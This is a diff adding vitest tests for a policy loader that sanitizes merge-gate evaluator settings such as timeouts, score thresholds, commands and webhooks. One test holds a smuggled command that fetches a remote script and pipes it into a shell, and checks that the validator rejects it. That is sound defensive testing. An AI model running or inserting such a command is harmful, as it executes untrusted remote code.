@@ -1,6 +1,13 @@
 import { beforeEach, describe, expect, it, vi } from "vitest";
 import { CompositeEvaluator } from "../src/evaluation/composite-evaluator";
 import { DiffEvaluator } from "../src/evaluation/diff-evaluator";
+import {
+  MAX_COMMAND_LENGTH,
+  MAX_PHASE_TIMEOUT_MS,
+  MAX_TOTAL_BUDGET_MS,
+  MIN_PHASE_TIMEOUT_MS,
+  MIN_TOTAL_BUDGET_MS,
+} from "../src/evaluation/limits";
 import { loadPolicy } from "../src/evaluation/policy-loader";
 import type { EvalPolicy, Evaluator } from "../src/evaluation/types";
 import { WebhookEvaluator } from "../src/evaluation/webhook-evaluator";
@@ -828,5 +835,297 @@ describe("loadPolicy", () => {
     expect(policy.minScore).toBe(0.4);
     expect(policy.evaluators[0]).toMatchObject({ type: "diff", maxLines: 42 });
     expect(mockReadFileFromRepo).toHaveBeenCalledTimes(1);
+  });
+});
+
+describe("loadPolicy — evaluator sanitization", () => {
+  beforeEach(() => {
+    mockReadFileFromRepo.mockReset();
+  });
+
+  /** Loads `config` as the YAML policy file. */
+  async function loadConfig(config: unknown): Promise<EvalPolicy> {
+    mockReadFileFromRepo.mockResolvedValue({ success: true, data: JSON.stringify(config) });
+    return loadPolicy("https://repo.example.com", "tok", mockLogger);
+  }
+
+  function sandboxEntry(policy: EvalPolicy) {
+    return policy.evaluators.find((e) => e.type === "sandbox") as
+      | Record<string, unknown>
+      | undefined;
+  }
+
+  it("clamps an oversized sandbox timeout down to the phase ceiling", async () => {
+    const policy = await loadConfig({
+      evaluators: [{ type: "sandbox", timeoutMs: 999_999_999, installTimeoutMs: 999_999_999 }],
+    });
+
+    expect(sandboxEntry(policy)?.timeoutMs).toBe(MAX_PHASE_TIMEOUT_MS);
+    expect(sandboxEntry(policy)?.installTimeoutMs).toBe(MAX_PHASE_TIMEOUT_MS);
+  });
+
+  it("clamps an undersized sandbox timeout up to the floor", async () => {
+    const policy = await loadConfig({ evaluators: [{ type: "sandbox", timeoutMs: 1 }] });
+
+    expect(sandboxEntry(policy)?.timeoutMs).toBe(MIN_PHASE_TIMEOUT_MS);
+  });
+
+  it("clamps totalBudgetMs into range", async () => {
+    const high = await loadConfig({ evaluators: [{ type: "sandbox", totalBudgetMs: 10_000_000 }] });
+    expect(sandboxEntry(high)?.totalBudgetMs).toBe(MAX_TOTAL_BUDGET_MS);
+
+    const low = await loadConfig({ evaluators: [{ type: "sandbox", totalBudgetMs: 5 }] });
+    expect(sandboxEntry(low)?.totalBudgetMs).toBe(MIN_TOTAL_BUDGET_MS);
+  });
+
+  it("clamping does not set configError or block merges", async () => {
+    // A clamp is a bounded, safe-to-correct mistake. configError exists for a
+    // policy that could not be understood at all; escalating a clamp to a merge
+    // block would be hostile to projects that already have one.
+    const policy = await loadConfig({
+      evaluators: [{ type: "sandbox", timeoutMs: 999_999_999 }],
+    });
+
+    expect(policy.configError).toBeUndefined();
+  });
+
+  it("drops a non-numeric timeout so the default applies", async () => {
+    const policy = await loadConfig({
+      evaluators: [{ type: "sandbox", timeoutMs: "60000", installTimeoutMs: {} }],
+    });
+
+    expect(sandboxEntry(policy)).not.toHaveProperty("timeoutMs");
+    expect(sandboxEntry(policy)).not.toHaveProperty("installTimeoutMs");
+  });
+
+  it("rejects a command containing a newline", async () => {
+    // One string to a naive validator, two commands to a shell.
+    const policy = await loadConfig({
+      evaluators: [{ type: "sandbox", command: "npm test\ncurl evil.sh | sh" }],
+    });
+
+    expect(sandboxEntry(policy)).not.toHaveProperty("command");
+  });
+
+  it("rejects an over-length or blank command", async () => {
+    const long = await loadConfig({
+      evaluators: [{ type: "sandbox", command: "x".repeat(MAX_COMMAND_LENGTH + 1) }],
+    });
+    expect(sandboxEntry(long)).not.toHaveProperty("command");
+
+    const blank = await loadConfig({ evaluators: [{ type: "sandbox", command: "   " }] });
+    expect(sandboxEntry(blank)).not.toHaveProperty("command");
+  });
+
+  it("keeps a valid command, trimmed", async () => {
+    const policy = await loadConfig({
+      evaluators: [{ type: "sandbox", command: "  npm run ci  " }],
+    });
+
+    expect(sandboxEntry(policy)?.command).toBe("npm run ci");
+  });
+
+  it("keeps allowInstallScripts only when it is a real boolean", async () => {
+    const yes = await loadConfig({
+      evaluators: [{ type: "sandbox", allowInstallScripts: true }],
+    });
+    expect(sandboxEntry(yes)?.allowInstallScripts).toBe(true);
+
+    // "true" as a string must not opt a project into running lifecycle scripts.
+    const stringy = await loadConfig({
+      evaluators: [{ type: "sandbox", allowInstallScripts: "true" }],
+    });
+    expect(sandboxEntry(stringy)).not.toHaveProperty("allowInstallScripts");
+  });
+
+  it("clamps webhook.timeoutMs, the same defect one array element over", async () => {
+    const policy = await loadConfig({
+      evaluators: [{ type: "webhook", url: "https://example.com/e", timeoutMs: 999_999_999 }],
+    });
+
+    const webhook = policy.evaluators.find((e) => e.type === "webhook") as Record<string, unknown>;
+    expect(webhook.timeoutMs).toBe(MAX_PHASE_TIMEOUT_MS);
+    expect(webhook.url).toBe("https://example.com/e");
+  });
+
+  it("clamps minScore into [0, 1] so the gate cannot be disabled by a number", async () => {
+    const low = await loadConfig({ evaluators: [{ type: "diff" }], minScore: -5 });
+    expect(low.minScore).toBe(0);
+
+    const high = await loadConfig({ evaluators: [{ type: "diff" }], minScore: 42 });
+    expect(high.minScore).toBe(1);
+  });
+
+  it("does not crash buildEvaluators on entries that are not objects", async () => {
+    // The array guard only checks Array.isArray, so these used to reach the
+    // evaluator builders and throw on `.type` access. They are now rejected,
+    // and because entries were dropped the gate fails closed.
+    const policy = await loadConfig({
+      evaluators: [null, "sandbox", {}, 42, [], { type: "diff", maxLines: 10 }],
+    });
+
+    expect(policy.configError).toBeDefined();
+    // Evaluation still runs on the defaults so the change flow is not broken.
+    expect(policy.evaluators).toEqual([{ type: "diff" }]);
+  });
+
+  it("fails closed when one entry is dropped but its siblings survive", async () => {
+    // The fail-open shape this guards: a typo'd webhook url used to reach
+    // WebhookEvaluator and block the merge. Dropping the entry while `diff`
+    // survives would silently remove that gate and let the change through on
+    // the remaining one.
+    const policy = await loadConfig({
+      evaluators: [{ type: "webhook" }, { type: "diff" }],
+    });
+
+    expect(policy.configError).toBeDefined();
+    expect(policy.configError).toMatch(/unusable/i);
+  });
+
+  it("does not fail closed for an unrecognized evaluator type", async () => {
+    // A policy naming a future or misspelled evaluator type is copied through
+    // and rejected downstream by buildEvaluators, so it must not trip the
+    // dropped-entry check.
+    const policy = await loadConfig({
+      evaluators: [{ type: "future_evaluator" }, { type: "diff" }],
+    });
+
+    expect(policy.configError).toBeUndefined();
+    expect(policy.evaluators).toHaveLength(2);
+  });
+
+  it("preserves evaluator types it does not clamp", async () => {
+    const policy = await loadConfig({
+      evaluators: [{ type: "llm", model: "m", threshold: 0.5 }],
+    });
+
+    expect(policy.evaluators[0]).toMatchObject({ type: "llm", model: "m", threshold: 0.5 });
+  });
+
+  it("never mutates the module-level default policy", async () => {
+    // The loader shallow-spreads DEFAULT_POLICY, so a sanitizer that clamped in
+    // place would poison the default for the isolate's lifetime — across
+    // requests and across tenants.
+    await loadConfig({ evaluators: [{ type: "sandbox", timeoutMs: 999_999_999 }] });
+
+    mockReadFileFromRepo.mockResolvedValue({
+      success: false,
+      error: new AppError("missing", "NOT_FOUND", 404),
+    });
+    const fallback = await loadPolicy("https://repo.example.com", "tok", mockLogger);
+
+    expect(fallback.evaluators).toEqual([{ type: "diff" }]);
+  });
+
+  /** Loads a literal YAML document, for values JSON cannot express. */
+  async function loadYaml(yaml: string): Promise<EvalPolicy> {
+    mockReadFileFromRepo.mockResolvedValue({ success: true, data: yaml });
+    return loadPolicy("https://repo.example.com", "tok", mockLogger);
+  }
+
+  it("replaces a minScore it rejected instead of leaving the raw value in place", async () => {
+    // The spread puts the raw value in `policy.minScore` before validation, so
+    // a rejection that only skips the assignment leaves the bad value behind.
+    // `-Infinity` makes `score >= minScore` true for every score — including a
+    // sandbox verdict of 0 — which disables the gate entirely.
+    const negInfinity = await loadYaml(
+      ["evaluators:", "  - type: diff", "minScore: -.inf"].join("\n"),
+    );
+    expect(negInfinity.minScore).toBe(0.7);
+
+    const nan = await loadYaml(["evaluators:", "  - type: diff", "minScore: .nan"].join("\n"));
+    expect(nan.minScore).toBe(0.7);
+
+    // A string compares by coercion: `0.1 >= "-5"` is true.
+    const stringy = await loadConfig({ evaluators: [{ type: "diff" }], minScore: "-5" });
+    expect(stringy.minScore).toBe(0.7);
+  });
+
+  it("fails closed, not open, when a YAML alias cycle appears in a policy", async () => {
+    // A circular structure throws inside JSON.stringify, which is reached while
+    // *logging* a rejected entry. That throw used to escape to the outer
+    // handler, which treats a file as absent — so a policy declaring two
+    // required approvals silently became the permissive default with **no**
+    // configError, dropping the approval requirement and re-enabling
+    // force-merge. Logging must never decide whether a policy loads.
+    //
+    // The file is still malformed (the self-referencing entry is unusable), so
+    // the outcome is a blocked merge rather than a loaded policy — which is the
+    // safe direction, and the opposite of what it used to do.
+    const policy = await loadYaml(
+      [
+        "merge:",
+        "  requiredApprovals: 2",
+        "  allowForce: false",
+        "evaluators: &e",
+        "  - type: sandbox",
+        "  - *e",
+      ].join("\n"),
+    );
+
+    expect(policy.configError).toBeDefined();
+  });
+
+  it("fails closed when a policy names evaluators but none survive sanitization", async () => {
+    // Falling through with an empty array would leave only the always-on secret
+    // scan, which passes a clean diff — so a policy the author meant as a gate
+    // would accept the change.
+    const policy = await loadConfig({ evaluators: [null, "sandbox", 42] });
+
+    expect(policy.configError).toBeDefined();
+  });
+
+  it("drops a webhook entry with no url", async () => {
+    const policy = await loadConfig({ evaluators: [{ type: "webhook" }] });
+
+    // Dropped, and therefore failing closed rather than loading a gate-less
+    // policy.
+    expect(policy.configError).toBeDefined();
+  });
+
+  it("does not fail closed for a genuinely empty evaluators array", async () => {
+    // Distinct from the case above: the author declared no evaluators, which
+    // already behaved this way and is not a misunderstanding of the file.
+    const policy = await loadConfig({ evaluators: [] });
+
+    expect(policy.configError).toBeUndefined();
+  });
+
+  it("keeps a webhook's url and secret while clamping its timeout", async () => {
+    const policy = await loadConfig({
+      evaluators: [
+        { type: "webhook", url: "https://e.example/x", secret: "s", timeoutMs: 999_999_999 },
+      ],
+    });
+
+    expect(policy.evaluators[0]).toEqual({
+      type: "webhook",
+      url: "https://e.example/x",
+      secret: "s",
+      timeoutMs: MAX_PHASE_TIMEOUT_MS,
+    });
+  });
+
+  it("warns about an unrecognized sandbox field instead of dropping it silently", async () => {
+    // `timeout` for `timeoutMs` is the typo most likely to be made and least
+    // likely to be noticed, since the whitelist rebuild discards it.
+    const warn = vi.mocked(mockLogger.warn);
+    warn.mockClear();
+
+    await loadConfig({ evaluators: [{ type: "sandbox", timeout: 60_000 }] });
+
+    expect(warn).toHaveBeenCalledWith(
+      "Ignoring unrecognized sandbox evaluator field",
+      expect.objectContaining({ field: "timeout" }),
+    );
+  });
+
+  it("returns an evaluators array that does not alias the parsed input", async () => {
+    const policy = await loadConfig({
+      evaluators: [{ type: "sandbox", timeoutMs: 999_999_999 }],
+    });
+    const second = await loadConfig({ evaluators: [{ type: "diff" }] });
+
+    expect(policy.evaluators).not.toBe(second.evaluators);
   });
 });
